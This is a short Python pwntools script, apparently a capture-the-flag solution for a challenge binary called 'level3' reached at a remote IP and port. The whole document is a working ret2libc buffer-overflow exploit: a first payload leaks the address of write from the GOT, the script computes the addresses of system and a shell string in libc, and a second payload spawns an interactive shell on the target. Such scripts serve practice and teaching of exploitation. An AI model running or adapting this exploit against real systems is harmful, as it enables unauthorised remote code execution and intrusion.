from pwn import *

#p=process("./level3")
p=remote('111.200.241.244',48932)

elf=ELF("./level3")
libc=ELF('./libc_32.so.6')

sys_r_write=libc.sym['write']-libc.sym['system']

bash_r_write=libc.sym['write']-0x0015902b 

payload='a'*0x8c+p32(elf.plt['write'])+p32(elf.sym['main'])+p32(1)+p32(elf.got['write'])+p32(10)

p.sendlineafter("Input:\n",payload)

a_write=u32(p.recv()[:4])

a_sys=a_write-sys_r_write

a_bash=a_write-bash_r_write

payload2='a'*0x8c+p32(a_sys)+'a'*4+p32(a_bash)

p.sendlineafter("Input:\n",payload2)

p.interactive()


